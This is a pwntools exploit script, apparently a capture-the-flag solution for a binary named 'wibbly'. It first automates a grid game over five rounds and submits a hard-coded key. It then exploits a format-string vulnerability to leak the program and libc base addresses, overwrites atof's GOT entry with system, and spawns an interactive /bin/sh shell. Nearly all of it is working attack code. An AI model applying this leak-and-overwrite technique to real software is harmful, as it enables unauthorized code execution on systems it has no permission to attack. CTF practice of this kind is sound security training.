#!/usr/bin/env python3

from pwn import *
import time

exe = ELF("./wibbly")
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    moveset = []

    def register_board():
    	board = []
    	
    	r.recvuntil("   012345678901234567890\n")
    	for i in range(20):
    		r.recvn(3) # line index
    		board.append(r.recvn(20))
    		r.recvn(1) # new line
    	
    	return board

    def print_board(board, positions):
    	print "   01234567890123456789"
    		
    	i = 0
    	for line in board:
    		print "%02d " % (i) + line
    		i = i + 1
    	print "current: " + str(positions[0])
    	print "target : " + str(positions[1])

    	i = 0
    	for angel in positions[2:]:
    		print "angel%02d: " % (i) + str(angel)
    		i = i + 1

    def locate_positions(board):
    	positions = []
    	angels = []
    	for i in range(20):
    		for j in range(20):
    			if board[i][j] == "^" or board[i][j] == "V" or board[i][j] == "<" or board[i][j] == ">":
    				positions.insert(0, [j, i])
    			elif board[i][j] == "E" or board[i][j] == "T":
    				positions.insert(1, [j, i])
    			elif board[i][j] == "A":
    				angels.append([j, i])

    	positions = positions + angels
    	return positions

    def check_possible_directions(current, positions):
    	currentN = [current[0], current[1]-1]
    	currentS = [current[0], current[1]+1]
    	currentW = [current[0]-1, current[1]]
    	currentE = [current[0]+1, current[1]]

    	for angel in positions[2:]:
    		if currentN == angel:
    			currentN = [-1, -1]
    		if currentS == angel:
    			currentS = [-1, -1]
    		if currentW == angel:
    			currentW = [-1, -1]
    		if currentE == angel:
    			currentE = [-1, -1]

    	directions = []
    	if (0 <= currentN[0]) and (currentN[0] <= 19) and (0 <= currentN[1]) and (currentN[1] <= 19):
    		directions.append("w")
    	else:
    		directions.append("-1")
    	if (0 <= currentW[0]) and (currentW[0] <= 19) and (0 <= currentW[1]) and (currentW[1] <= 19):
    		directions.append("a")
    	else:
    		directions.append("-1")
    	if (0 <= currentS[0]) and (currentS[0] <= 19) and (0 <= currentS[1]) and (currentS[1] <= 19):
    		directions.append("s")
    	else:
    		directions.append("-1")
    	if (0 <= currentE[0]) and (currentE[0] <= 19) and (0 <= currentE[1]) and (currentE[1] <= 19):
    		directions.append("d")
    	else:
    		directions.append("-1")

    	return directions

    def calculate_move(board, positions):
    	current = positions[0]
    	target = positions[1]

    	# w = 0
    	# a = 1
    	# s = 2
    	# d = 3

    	directions = check_possible_directions(current, positions)
    		
    	if target[1] > current[1]: # if target is lower in the board
    		if (directions[2] == "s"):
    			move = "s"
    			current = [current[0], current[1]+1]
    			moveset.append(current)
    		elif (directions[1] == "a"):
    			move = "a"
    			current = [current[0]-1, current[1]]
    			moveset.append(current)
    		elif (directions[3] == "d"):
    			move = "d"
    			current = [current[0]+1, current[1]]
    			moveset.append(current)
    		else:
    			move = "w"
    			current = [current[0], current[1]-1]
    			moveset.append(current)

    	elif target[1] < current[1]: # if target is higher in the board
    		if (directions[0] == "w"):
    			move = "w"
    			current = [current[0], current[1]-1]
    			moveset.append(current)
    		elif (directions[1] == "a"):
    			move = "a"
    			current = [current[0]-1, current[1]]
    			moveset.append(current)
    		elif (directions[3] == "d"):
    			move = "d"
    			current = [current[0]+1, current[1]]
    			moveset.append(current)
    		else:
    			move = "s"
    			current = [current[0], current[1]+1]
    			moveset.append(current)

    	elif target[1] == current[1]: # same line
    		if target[0] > current[0]: # if target is more to the right in the board
    			if (directions[3] == "d"):
    				move = "d"
    				current = [current[0]+1, current[1]]
    				moveset.append(current)
    			elif (directions[2] == "s"):
    				move = "s"
    				current = [current[0], current[1]+1]
    				moveset.append(current)
    			elif (directions[0] == "w"):
    				move = "w"
    				current = [current[0], current[1]-1]
    				moveset.append(current)
    			else:
    				move = "a"
    				current = [current[0]-1, current[1]]
    				moveset.append(current)

    		elif target[0] < current[0]: # if target is more to the left of the board
    			if (directions[1] == "a"):
    				move = "a"
    				current = [current[0]-1, current[1]]
    				moveset.append(current)
    			elif (directions[2] == "s"):
    				move = "s"
    				current = [current[0], current[1]+1]
    				moveset.append(current)
    			elif (directions[0] == "w"):
    				move = "w"
    				current = [current[0], current[1]-1]
    				moveset.append(current)
    			else:
    				move = "d"
    				current = [current[0]+1, current[1]]
    				moveset.append(current)
    		else:
    			print "yay?"
    	
    	return move	




    def win_round():
    	board = register_board()
    	positions = locate_positions(board)
        target = positions[1]

    	print_board(board, positions)
    	move = calculate_move(board, positions)
        r.sendline(move)
        
        while target != moveset[-1]:
            board = register_board()
            positions = locate_positions(board)
            print_board(board, positions)
            move = calculate_move(board, positions)
            r.sendline(move)

    def win_game():
    	for i in range(5):
    		win_round()

    def send_key():
        r.sendline("UeSlhCAGEp")
    
    win_game()
    send_key()
    
    r.send("1"*8 + "\x00")
    time.sleep(2)
    r.send(p32(0x55592b70))
    r.sendline("1")
    r.send("1"*8 + "\x03")

    r.sendline("3") # dematerialize

    # leak elf address
    r.sendline("51.49213700, -0.19287800" + "%269$x")
    r.recvuntil("Coordinate 51.49213700, -0.19287800")
    leak = int(r.recvn(8), 16)
    exe.address = leak - 0x3122
    log.info("elf base address: {}".format(hex(exe.address)))
    log.info("atof@got: {}".format(hex(exe.got['atof'])))

    # leak libc address
    r.sendline("51.49213700, -0.19287800" + p32(exe.got['puts']) + "%21$s")
    r.recvuntil("Coordinate 51.49213700, -0.19287800")
    leak = u32(r.recvn(8)[-4:])
    libc.address = leak - libc.symbols['puts']
    log.info("libc base address: {}".format(hex(libc.address)))

    #gdb.attach(r)

    # overwrite atof@got with system
    system = libc.symbols['system']

    r.sendline("51.49213700, -0.19287800" + p32(exe.got['atof']) + p32(exe.got['atof'] + 2) +  "%{}x".format((system&0xffff) - 32) + "%21$hn" + "%{}x".format(((system & 0xffff0000) >> 16) - (system&0xffff)) + "%22$hn")
    r.sendline(",/bin/sh\x00")

    
    r.interactive()


if __name__ == "__main__":
    main()

'''
UeSlhCAGEp
'''